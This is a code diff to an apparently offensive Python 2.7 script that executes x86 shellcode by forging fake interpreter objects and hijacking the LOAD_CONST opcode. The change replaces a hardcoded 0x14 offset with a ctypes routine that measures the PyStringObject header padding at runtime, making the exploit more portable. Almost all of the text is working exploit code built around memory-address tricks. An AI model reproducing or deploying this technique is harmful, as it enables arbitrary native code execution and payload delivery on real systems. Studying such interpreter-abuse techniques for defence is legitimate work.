@@ -26,6 +26,21 @@ import types
 import opcode
 import platform
 import sys
+from ctypes import c_char
+
+def get_string_object_padding():
+    """
+    Find at runtime the padding PyStringObject -> PyStringObject.ob_sval:
+        typedef struct {        +
+            PyObject_VAR_HEAD   |
+            long ob_shash;      | We want to know that size
+            int ob_sstate;      |
+            char ob_sval[1];    +
+        } PyStringObject;
+    """
+    marker = 'ABCDEFGH'
+    r = (c_char * 100).from_address(id(marker))
+    return r.raw.find(marker)
 
 def pack_ushort(us):
     return struct.pack('<H', us)
@@ -43,16 +58,17 @@ def exec_x86_shellcodes_via_python27_opcodes_(addr_x86_code):
         """Pull the trigger motherfucker"""
         pass
 
+    padding_size = get_string_object_padding()
     const_tuple = ()
     addr_const_tuple = id(const_tuple)
 
     first_indirection = 'A' * 0x40 + pack_uint(addr_x86_code)
     addr_first_indirection = id(first_indirection)
-    addr_first_indirection_controled_data = addr_first_indirection + 0x14
+    addr_first_indirection_controled_data = addr_first_indirection + padding_size
 
     fake_object = 'AAAA' + pack_uint(addr_first_indirection_controled_data)
     addr_fake_object = id(fake_object)
-    addr_fake_object_controled = addr_fake_object + 0x14
+    addr_fake_object_controled = addr_fake_object + padding_size
 
     # In LOAD_CONST:
     # CPU Disasm
@@ -65,7 +81,7 @@ def exec_x86_shellcodes_via_python27_opcodes_(addr_x86_code):
 
     ptr_object = pack_uint(addr_fake_object_controled)
     addr_ptr_object = id(ptr_object)
-    addr_ptr_data_controled = addr_ptr_object + 0x14
+    addr_ptr_data_controled = addr_ptr_object + padding_size
 
     # Compute the offset
     # Remember:
@@ -121,7 +137,7 @@ def main(argc, argv):
     #     int ob_sstate;
     #     char ob_sval[1]; // <- OUR STR1NGZ
     # } PyStringObject;
-    address_shellcode = id(sh) + 0x14
+    address_shellcode = id(sh) + get_string_object_padding()
     exec_x86_shellcodes_via_python27_opcodes_(address_shellcode)
 
 if __name__ == '__main__':
